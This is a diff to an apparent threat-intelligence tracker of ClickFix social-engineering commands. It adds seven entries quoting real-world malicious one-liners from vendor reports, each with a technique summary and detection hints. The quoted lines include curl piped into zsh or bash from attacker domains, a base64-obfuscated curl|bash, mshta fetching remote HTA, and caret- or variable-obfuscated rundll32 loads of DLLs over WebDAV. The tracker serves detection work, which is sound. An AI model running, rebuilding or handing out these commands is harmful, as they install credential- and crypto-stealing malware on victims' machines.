@@ -7,8 +7,8 @@ ClickFix is a social-engineering technique where a victim is tricked (fake CAPTC
 check, browser or document "error") into pasting and running an attacker-supplied command in the
 Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user's own permissions.
 
-- **Entries:** 35
-- **Last updated:** 2026-09-17
+- **Entries:** 42
+- **Last updated:** 2026-09-22
 - **Maintained by:** PAI ClickFix Tracker (daily) · source: [Sergio-Albea-Git/Threat-Hunting-KQL-Queries](https://github.com/Sergio-Albea-Git/Threat-Hunting-KQL-Queries)
 
 ## Commands
@@ -50,6 +50,13 @@ Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user
 | cf-0033 | `mshta.exe` | Fake AI installer (OpenAI Codex / Anthropic Claude pages on Google Sites) ClickFix lure runs mshta against a numeric-path remote HTA delivering an in-memory stealer | ITSEC Asia R&D / Intellibron |
 | cf-0034 | `powershell.exe` | Fake AI installer ClickFix lure clears the console then IEX-executes the .Content of an Invoke-WebRequest to a lookalike 'claudescript' domain (in-memory stealer) | ITSEC Asia R&D / Intellibron |
 | cf-0035 | `bash (macOS Terminal)` | macOS ClickFix fake CAPTCHA pastes a Terminal one-liner that curls an IP-hosted bash loader to a hidden /tmp dotfile, runs it, self-deletes, then scrubs scrollback and shell history to hide the crypto-draining stealer | Huntress |
+| cf-0036 | `cmd.exe (Run dialog) -> rundll32.exe` | ClearFake fake Google CAPTCHA; pushd maps a WebDAV share, then rundll32 loads a DLL disguised as 'pf.ch' by ordinal; leads to Amatera stealer, ZigCryptoStealer and NetSupport Manager | Cisco Talos |
+| cf-0037 | `zsh (macOS Terminal)` | PasteSwitch: hijacked HBO Max Reddit ads led to a fake Alfred app page; decoy env-var exports are followed by curl piped into zsh, which delivers MacSync/AMOS | adamnet.works (PasteSwitch research) |
+| cf-0038 | `mshta.exe` | PasteSwitch Windows branch: a fake Claude desktop lure on cladesktop.gitlab.io runs a remote HTA via mshta, which stages Amatera stealer | adamnet.works (PasteSwitch research) |
+| cf-0039 | `bash (macOS Terminal)` | A here-string feeds a base64-decoded 'curl -s hxxps://black-feather-9cfd.adrianroy-01.workers[.]dev | bash' into bash; the crimekit rotates C2 domains through a Polygon contract (EtherHiding) | NetbyteSEC |
+| cf-0040 | `powershell.exe -> WMI (WmiPrvSE.exe) -> cmd.exe -> rundll32.exe` | PowerShell starts a hidden cmd through WMI Win32_Process.Create, which breaks the explorer->cmd parent chain; cmd then mounts a WebDAV share over SSL and runs a DLL named 'gc.key' by ordinal #1 | CyberProof |
+| cf-0041 | `pcalua.exe -> powershell.exe -> cmd.exe -> rundll32.exe` | Program Compatibility Assistant proxies PowerShell, which uses Start-Process (saps) to launch cmd; carets split 'pushd' and 'rundll32', and a DLL disguised as 'j.pm' runs from WebDAV by ordinal | CyberProof |
+| cf-0042 | `cmd.exe` | Delayed-expansion variables rebuild 'pushd' and 'rundll32', and a for-loop runs the pushd to a WebDAV share over SSL on port 443; rundll32 then loads 'goog.ct' by ordinal #1 | CyberProof |
 
 ### cf-0001 — `powershell.exe`
 
@@ -435,6 +442,83 @@ export SRC_URL='hxxps://profitnow[.]io/' && (cd /tmp && curl -kfsSL "hxxp://193.
 - **Detection:** On macOS, alert on Terminal-spawned curl to a raw IP writing a hidden dotfile in /tmp piped to bash, immediately followed by history -d / fc -p / printf '\033[3J' history-clearing
 - **Source:** Huntress — https://www.huntress.com/blog/mac-crypto-draining-malware
 - **Added:** 2026-08-06
+
+### cf-0036 — `cmd.exe (Run dialog) -> rundll32.exe`
+
+```text
+pushd \\leaguejazire[.]com\<randomized_subdomain>\<victim_identifier> && rundll32 pf.ch moor && popd
+```
+
+- **Technique:** ClearFake fake Google CAPTCHA; pushd maps a WebDAV share, then rundll32 loads a DLL disguised as 'pf.ch' by ordinal; leads to Amatera stealer, ZigCryptoStealer and NetSupport Manager
+- **Detection:** Look for explorer.exe starting cmd.exe with 'pushd \\' and rundll32 loading a DLL with an odd extension (.ch/.ct/.google) from a DavWWWRoot/WebClient path in the same line; check RunMRU
+- **Source:** Cisco Talos — https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
+- **Added:** 2026-09-08
+
+### cf-0037 — `zsh (macOS Terminal)`
+
+```text
+export STATE_lim=v3.16.6 export _watch_ix=c8ae6d2b curl -fsS "hxxps://ember-bridge[.]com/curl/quohwuhu5o2/setup.sh" | zsh
+```
+
+- **Technique:** PasteSwitch: hijacked HBO Max Reddit ads led to a fake Alfred app page; decoy env-var exports are followed by curl piped into zsh, which delivers MacSync/AMOS
+- **Detection:** Look for Terminal/zsh sessions running curl -fsS against a '/curl/<id>/setup.sh' path piped into zsh, especially after throwaway 'export' lines; flag ember-bridge/weaveridge7 domains
+- **Source:** adamnet.works (PasteSwitch research) — https://adamnet.works/blog/hbo-max-ads-exposed-the-pasteswitch-clickfix-operation/
+- **Added:** 2026-09-13
+
+### cf-0038 — `mshta.exe`
+
+```text
+mshta hxxps://desktop-version[.]com/app
+```
+
+- **Technique:** PasteSwitch Windows branch: a fake Claude desktop lure on cladesktop.gitlab.io runs a remote HTA via mshta, which stages Amatera stealer
+- **Detection:** Look for explorer.exe spawning mshta.exe with an extensionless HTTPS URL path such as '/app'; hunt for desktop-version[.]com and oakenfjrod[.]ru, and the Amatera C2 at 77.91.65[.]13:443
+- **Source:** adamnet.works (PasteSwitch research) — https://adamnet.works/blog/hbo-max-ads-exposed-the-pasteswitch-clickfix-operation/
+- **Added:** 2026-09-13
+
+### cf-0039 — `bash (macOS Terminal)`
+
+```text
+bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9ibGFjay1mZWF0aGVyLTljZmQuYWRyaWFucm95LTAxLndvcmtlcnMuZGV2JyB8IGJhc2g=" | base64 -d)
+```
+
+- **Technique:** A here-string feeds a base64-decoded 'curl -s hxxps://black-feather-9cfd.adrianroy-01.workers[.]dev | bash' into bash; the crimekit rotates C2 domains through a Polygon contract (EtherHiding)
+- **Detection:** Look for bash/zsh command lines with '<<<' plus 'base64 -d', and for curl calls to *.workers.dev from a Terminal whose parent is a browser session
+- **Source:** NetbyteSEC — https://notes.netbytesec.com/2026/08/anatomy-of-macos-clickfix-crimekit-that.html
+- **Added:** 2026-08-20
+
+### cf-0040 — `powershell.exe -> WMI (WmiPrvSE.exe) -> cmd.exe -> rundll32.exe`
+
+```text
+"powershell" -c "$s=([wmiclass]'Win32_ProcessStartup').CreateInstance();$s.ShowWindow=0;([wmiclass]'Win32_Process').Create('cmd /v/c pushd \\vqrlwsmzu[.]webyek[.]com@SSL\<GUID> & rundll32 gc.key,#1'
+```
+
+- **Technique:** PowerShell starts a hidden cmd through WMI Win32_Process.Create, which breaks the explorer->cmd parent chain; cmd then mounts a WebDAV share over SSL and runs a DLL named 'gc.key' by ordinal #1
+- **Detection:** Look for WmiPrvSE.exe spawning cmd.exe that contains 'pushd \\' and '@SSL', and for PowerShell lines containing "[wmiclass]'Win32_Process'" together with ShowWindow=0
+- **Source:** CyberProof — https://www.cyberproof.com/blog/clickfix-keeps-evolving-rundll32-ordinal-execution-over-webdav/
+- **Added:** 2026-07-28
+
+### cf-0041 — `pcalua.exe -> powershell.exe -> cmd.exe -> rundll32.exe`
+
+```text
+pcalua.exe -a "PowerShell" -c "saps cmd '/v/c pu^shd \\uttepcheweaxtowxdj.gentletouchchiropracticclinicauroracol[.]com@SSL\<GUID> && ru^ndll32 j.pm,#1'"
+```
+
+- **Technique:** Program Compatibility Assistant proxies PowerShell, which uses Start-Process (saps) to launch cmd; carets split 'pushd' and 'rundll32', and a DLL disguised as 'j.pm' runs from WebDAV by ordinal
+- **Detection:** Look for pcalua.exe with '-a PowerShell', and for cmd lines containing caret-split 'pu^shd' or 'ru^ndll32' plus '@SSL\'
+- **Source:** CyberProof — https://www.cyberproof.com/blog/clickfix-keeps-evolving-rundll32-ordinal-execution-over-webdav/
+- **Added:** 2026-07-28
+
+### cf-0042 — `cmd.exe`
+
+```text
+cmd /v:on /c "set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x hcwjcope.poundbahis[.]com@SSL@443\<GUID> & !c!!d! goog.ct,#1"
+```
+
+- **Technique:** Delayed-expansion variables rebuild 'pushd' and 'rundll32', and a for-loop runs the pushd to a WebDAV share over SSL on port 443; rundll32 then loads 'goog.ct' by ordinal #1
+- **Detection:** Look for cmd.exe with '/v:on', short 'set' fragments like 'pu'/'shd'/'dll32', a 'for %x in (!' construct, and '@SSL@443' in one command line
+- **Source:** CyberProof — https://www.cyberproof.com/blog/clickfix-keeps-evolving-rundll32-ordinal-execution-over-webdav/
+- **Added:** 2026-07-28
 
 ## Threat Hunting (KQL — Microsoft Defender XDR)
 
